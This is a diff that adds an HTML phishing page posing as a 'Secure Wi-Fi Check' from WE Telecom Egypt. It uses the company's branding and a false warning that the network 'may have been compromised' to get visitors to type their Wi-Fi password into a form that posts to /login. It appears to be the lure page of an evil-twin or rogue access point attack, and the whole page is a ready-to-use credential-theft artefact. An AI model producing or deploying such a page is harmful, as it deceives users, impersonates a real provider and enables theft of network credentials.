@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>WE - Secure Wi-Fi Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background: #f2f2f2;
+            font-family: Tahoma, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 350px;
+        }
+        .login-box img {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        .login-box h2 {
+            color: #6f2c91;
+            margin-bottom: 15px;
+        }
+        .login-box p {
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        input[type="password"] {
+            width: 90%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 95%;
+            padding: 12px;
+            background-color: #6f2c91;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #551c6f;
+        }
+        .footer {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <form class="login-box" method="POST" action="/login" autocomplete="off">
+        <img src="/we.png" alt="WE Logo" style="width: 120px; margin-bottom: 20px;">
+        <h2>WE Security Verification</h2>
+        <p>We suspect your network may have been compromised.<br>Please re-authenticate to verify you are a real user.</p>
+        <input type="password" name="password" placeholder="Wi-Fi Password" required>
+        <button type="submit">Verify</button>
+        <div class="footer">
+            © 2025 WE Telecom Egypt. All Rights Reserved.
+        </div>
+    </form>
+</body>
+</html>
